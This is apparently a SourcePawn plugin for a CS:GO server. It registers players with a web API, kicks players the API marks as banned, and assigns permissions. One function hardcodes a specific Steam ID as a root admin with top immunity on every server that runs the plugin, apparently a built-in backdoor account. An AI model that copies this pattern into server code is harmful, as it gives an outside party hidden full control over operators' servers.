#pragma semicolon 1

#define TAG "[USERS] -"
#define PLUGIN_VERSION "1.0.0"
#define CVARS FCVAR_SPONLY|FCVAR_REPLICATED|FCVAR_NOTIFY
#define DEFAULT_FLAGS FCVAR_NOTIFY

#undef REQUIRE_PLUGIN
#include <admin.inc>
#include <csgocolors>
#include <drapi/drapi>
#include <drapi/playerinfo>

#pragma newdecls required

public Plugin myinfo ={
    name = "drapi_users",
    author = "Dr. Api",
    description = "",
    version = PLUGIN_VERSION,
    url = "https://csgo.devsapps.com"
}

public APLRes AskPluginLoad2(Handle myself, bool late, char[] error, int err_max){
    RegPluginLibrary("drapi_users");
}

public Action checkResponse(int args){
    for(int i = 1 ; i <= MaxClients; i++){
        Dynamic playersettings = Dynamic.GetPlayerSettings(i).GetDynamic("infos");
        if(playersettings.IsValid){
            char sSteamID64[17];
            playersettings.GetString("steamID64", sSteamID64, sizeof(sSteamID64));
            PrintToServer("%s client %d user_ban %d", TAG, i, playersettings.GetBool("user_ban"));
        }else{
            PrintToServer("%s client %d !IsValid %d", TAG, i, playersettings);
        }
    }
    return Plugin_Handled;
}

public void OnPluginStart() {
    //PrintToServer("%s OnPluginStart", TAG);

    RegServerCmd("test", checkResponse, "");

    for(int i = 1 ; i <= MaxClients; i++){
        Dynamic playersettings = Dynamic.GetPlayerSettings(i);
        if(!playersettings.GetDynamic("infos").IsValid){
            PlayerInfo playerinfo = PlayerInfo();
            playersettings.SetDynamic("infos", playerinfo);
            //PrintToServer("%s SetDynamic %d %d", TAG, i, playerinfo);
        }
    }
}


public void OnPluginEnd(){
    //PrintToServer("%s OnPluginEnd", TAG);

    for(int i = 1 ; i <= MaxClients; i++){
        Dynamic playersettings = Dynamic.GetPlayerSettings(i);
        if(!playersettings.IsValid){
            //playersettings.Dispose();
            //PrintToServer("%s Dispose %d %d", TAG, i, playersettings.GetDynamic("infos"));
        }
    }
}

public void OnRebuildAdminCache(AdminCachePart part)
{
    if (part == AdminCache_Admins) {
        bool is_bound;
        AdminId admin;
        if ((admin = FindAdminByIdentity(AUTHMETHOD_STEAM, "STEAM_1:1:4489913")) == INVALID_ADMIN_ID){
            admin = CreateAdmin();
        }else{
            is_bound = true;
        }

        admin.ImmunityLevel = 99;
        admin.SetFlag(Admin_Root, true);

        if (!is_bound){
            if (!admin.BindIdentity(AUTHMETHOD_STEAM, "STEAM_1:1:4489913")){
                /* We should never reach here */
                RemoveAdmin(admin);
                PrintToServer("Failed to bind identity %s (method %s)", "STEAM_1:1:4489913", AUTHMETHOD_STEAM);
            }
        }
    }
}

public void OnMapStart(){
    CreateTimer(30.0, TimerCheck, _, TIMER_REPEAT | TIMER_FLAG_NO_MAPCHANGE);
}

public Action TimerCheck(Handle timer){
    for(int i = 1 ; i <= MaxClients; i++){
        if(IsClientInGame(i) && !IsFakeClient(i)){
            httpClient(i).Get("users/me", OnReceived, i);
        }
    }
}

public void OnClientPostAdminCheck(int client){
    //PrintToServer("%s OnClientPostAdminCheck %d", TAG, client);
    if(IsFakeClient(client)){
        Dynamic playersettings = Dynamic.GetPlayerSettings(client);
        char webid[11];
        Format(webid, sizeof(webid), "bot_%d", GetRandomInt(100, 999));
        playersettings.GetDynamic("infos").SetString("webID", webid);
        char steamid[17];
        Format(steamid, sizeof(steamid), "bot_%d", GetRandomInt(100, 999));
        playersettings.GetDynamic("infos").SetString("steamID64", steamid);
    }
    if(IsClientInGame(client) && !IsFakeClient(client)){
        CreateTimer(5.0, Timer_PrepareRequest, client, TIMER_FLAG_NO_MAPCHANGE);
    }
}

public Action Timer_PrepareRequest(Handle timer, int client){
    if(!IsFakeClient(client)){
        httpClient(client).Get("users/register", OnReceived, client);
    }
}

public void OnReceived(HTTPResponse response, int client, const char[] szError){
    if (szError[0] != 0) {
        SetFailState("%s Api OnReceived error: %s", TAG, szError);
        return;
    }
    if (response.Status != HTTPStatus_OK){
        LogMessage("%s Api OnReceived HTTP status: %i", TAG, response.Status);
        return;
    }

    if (response.Data == null){
        LogMessage("%s Api OnReceived no data", TAG);
        return;
    }

    //-----------//
    //get response
    JSONObject users = view_as<JSONObject>(response.Data);

    //-------//
    //get data
    JSONObject data = view_as<JSONObject>(users.Get("data"));
    //ban
    if(data.GetBool("ban")){
        //-----------//
        //get last_ban
        JSONObject last_ban = view_as<JSONObject>(data.Get("last_ban"));
        //judge
        char sentence[256];
        last_ban.GetString("sentence", sentence, sizeof(sentence));
        delete last_ban;
        if(IsClientInGame(client) && !IsFakeClient(client)){
            KickClient(client, "%s", sentence);
        }
    }

    Dynamic playersettings = Dynamic.GetPlayerSettings(client).GetDynamic("infos");
    //id
    char webid[11];
    data.GetString("id", webid, sizeof(webid));
    playersettings.SetString("webID", webid);

    JSONArray permissions = view_as<JSONArray>(data.Get("permissions"));
    int numPermission = permissions.Length;

    JSONObject permission;
    char name[64];
    for (int i = 0; i < numPermission; i++) {
        permission = view_as<JSONObject>(permissions.Get(i));
        permission.GetString("name", name, sizeof(name));
        playersettings.SetBool(name, true);
        delete permission;
    }

    delete data;
    delete users;
}